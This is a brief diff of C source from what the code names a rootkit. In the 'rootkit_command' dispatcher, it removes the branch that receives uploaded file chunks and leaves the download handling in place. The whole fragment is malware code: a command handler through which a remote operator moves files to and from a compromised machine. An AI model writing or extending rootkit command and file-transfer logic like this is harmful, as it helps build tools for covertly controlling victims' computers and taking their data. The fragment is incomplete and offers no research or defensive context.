@@ -99,12 +99,6 @@ static int help_handler(char *args, enum Protocol protocol) {
 }
 
 int rootkit_command(char *command, unsigned command_size, enum Protocol protocol) {
-    // Handle ongoing upload
-    if (receiving_file) {
-        DBG_MSG("rootkit_command: receiving upload chunk (%u bytes)\n", command_size);
-        return handle_upload_chunk(command, command_size, protocol);
-    }
-
     // Handle ongoing download
     if (download(command) == 0) {
         return 0;
